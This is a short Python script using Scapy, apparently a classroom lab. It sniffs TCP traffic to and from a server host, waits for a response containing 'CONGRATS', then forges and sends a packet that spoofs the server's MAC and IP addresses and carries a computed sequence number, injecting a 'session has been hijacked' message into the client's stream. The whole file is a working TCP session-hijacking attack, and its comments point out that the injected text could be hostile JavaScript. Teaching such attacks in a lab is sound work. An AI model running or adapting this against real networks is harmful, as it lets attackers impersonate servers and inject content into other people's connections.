from scapy.all import *
def start():

    # we sniff all TCP packets with s3 as source of destination
    # the function hijack_server is then called with each captured packer
    sniff(prn=hijack_server, filter='tcp and host s3')

def hijack_server(p):
    # we want to send one more packet after the one that had the HTTP payload
    # in thi case, we know that his payload has the string "CONGRATS" in it
    # since this is a toy example to hijack communication with our own
    # set up server
    # Several packets have s3 as source or destination
    # We care only about the ones that have a payload

    # in Scappy parlance, this means the ones that have a "Raw" layer
    if (p.haslayer(Raw)) :
        # among those, we want the one with CONGRATS in its payload
        if("CONGRATS" in str(p[Raw].load)):
            # Now we build the packet, to impersonate s3, with its addresses
            # Note that we could use another mac address ...
            ether = Ether(src=p[Ether].src, dst=p[Ether].dst)
            ip = IP(src=p[IP].src, dst=p[IP].dst)

            # the tricky part is to change the sequence number to take into
            # account the bytes that have been sent in the previous
            # (ie the now captured) packet
            # Our packet, to be accepted by c1 as the next packet, must
            # have a sequence number equal to the last one received +
            # the length of the payload sent in that last one.

            tcp = TCP(sport=p[TCP].sport, dport=p[TCP].dport, seq=p[TCP].seq + len(p[TCP].payload), ack=p[TCP].ack, flags="AP")
    
            payload = "\n\n*********\n\nBad guy is in charge now! \n"
            payload += "Session has been hijacked \n"
            payload += "This could have been a javascript.\n"
            payload += "It could have hacked your browser without you knowing!"

            #Final step: we build the packet and send it
            packet = ether / ip / tcp / payload
            sendp(packet)


# invoking start() to start sniffing when invoked  
start()
